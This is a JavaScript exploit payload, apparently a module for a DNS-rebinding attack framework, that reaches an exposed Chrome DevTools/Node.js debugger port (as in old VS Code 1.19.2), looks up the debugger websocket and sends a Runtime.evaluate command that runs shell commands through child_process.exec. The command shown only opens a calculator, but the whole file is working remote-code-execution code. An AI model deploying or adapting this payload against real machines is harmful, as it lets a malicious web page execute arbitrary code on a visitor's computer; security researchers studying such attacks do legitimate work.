/**
    Multi-platform exploit adapted from:
    https://medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486b

    Tested against VS Studio Code 1.19.2 and at least one another software with a slight modification.
    Subsequent versions of VS Studio Code fixed the issue.
    The default port is TCP 9333 (localhost:9333).
**/

const ChromeDevTools = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        fetch('/json')
            .then(function (response) {
                return response.text()
            })
            .then(function (d) {
                let data = JSON.parse(d)[0];
                let wsid = data.id;
                let wsURL = "ws://" + window.location.hostname + ":" + window.location.port +
                    "/" + wsid;
                console.log(wsURL);
                exploit(wsURL);
            })
    }

    function exploit(url) {
        function nodejs() {
            const cmd = {
                darwin: 'open /Applications/Calculator.app',
                win32: 'calc',
                linux: 'xcalc',
            };
            process.mainModule.require('child_process').exec(
                cmd[process.platform])
        };
        const packet = {
            "id": 1,
            "method": "Runtime.evaluate",
            "params": {
                "expression": `(${nodejs})()`,
            }
        };
        const ws = new WebSocket(url);
        ws.onopen = () => ws.send(JSON.stringify(packet));
        ws.onmessage = (data) => console.log(data);
        ws.onerror = (e) => console.log(e);
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return fetch("/json",{
            mode: 'no-cors',
            credentials: 'omit',
        })
            .then(function (response) {
                return response.text()
            })
            .then(function (d) {
                if (d.includes("node.js instance") === true) {
                    return true;
                } else {
                    return false;
                }
            })
            .catch(e => { return (false); })
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["Chrome DevTools RCE"] = ChromeDevTools();



